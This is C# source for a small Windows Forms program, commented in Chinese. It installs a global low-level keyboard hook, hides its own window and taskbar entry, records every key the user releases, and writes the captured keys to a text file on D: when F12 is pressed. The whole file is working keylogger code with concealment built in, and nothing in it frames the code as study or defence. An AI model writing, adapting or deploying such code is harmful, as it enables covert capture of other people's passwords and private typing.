using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace hok
{
    public partial class Form1 : Form
    {
        public int m_hookHandle = 0;
        public Win32API.DelHookProc m_pfnHookProc = null;

        //宣告NotifyIcon
        private System.Windows.Forms.NotifyIcon notifyIcon1;

        public Form1()
        {
            InitializeComponent();
            //指定使用的容器
            this.components = new System.ComponentModel.Container();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            //建立NotifyIcon
            this.notifyIcon1.Icon = new Icon("mail.ico");
            this.notifyIcon1.Text = "HookExample";
            //點Icon兩下執行此動作
            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            SetVisibleCore(false); 
        }

        public int HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (wParam.ToInt32() == Win32API.WM_KEYUP || wParam.ToInt32() == Win32API.WM_SYSKEYUP)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                KeyboardHookStruct MyKeyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
                Keys keyData = (Keys)MyKeyboardHookStruct.vkCode;

                //int check_i = 0;

                if (string.Format(keyData.ToString()) == "F12")
                {
                    // 建立檔案串流（@ 可取消跳脫字元 escape sequence）
                    StreamWriter sw = new StreamWriter(@"D:\cc.txt");
                    foreach (var aaa in listView1.Items) sw.WriteLine(aaa);// 寫入文字
                    sw.Close();						// 關閉串流
                }else {
                    listView1.Items.Add(string.Format(keyData.ToString()));
                }
            }
            return Win32API.CallNextHookEx(m_hookHandle, nCode, wParam, lParam);
        }


        private void Form1_Load(object sender, EventArgs e)
        {

            //this.Visible = false;//隱藏當前窗口 
            //this.notifyIcon1.Visible = true;//顯示任務欄的圖標 

            //去掉下面if就需打自定義結束password write txt?
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
                this.Visible = false;//隱藏當前窗口 
                this.notifyIcon1.Visible = true;//顯示任務欄的圖標 
            }

            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    m_pfnHookProc = new Win32API.DelHookProc(HookProc);
                    m_hookHandle = Win32API.SetWindowsHookEx(
                        Win32API.WH_KEYBOARD_LL,
                        m_pfnHookProc,
                        Win32API.GetModuleHandle(curModule.ModuleName),
                        0
                    );
                }

                if (m_hookHandle == 0)
                {
                    MessageBox.Show("呼叫 SetWindowsHookEx 失敗!");
                    return;
                }
            }
        }

       
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            bool ret = Win32API.UnhookWindowsHookEx(m_hookHandle);
            if (ret == false)
            {
                MessageBox.Show("呼叫 UnhookWindowsHookEx 失敗!");
                return;
            }
            m_hookHandle = 0;
        }

        void HookManager_KeyUp(object sender, KeyEventArgs e)
        {
            //listView1.Items.Add(e.KeyCode.ToString());
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        //圖標點兩下的時候?
        protected void notifyIcon1_MouseDoubleClick(object sender, EventArgs e)
        {
            //讓Form再度顯示，並寫狀態設為Normal
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

    }
}
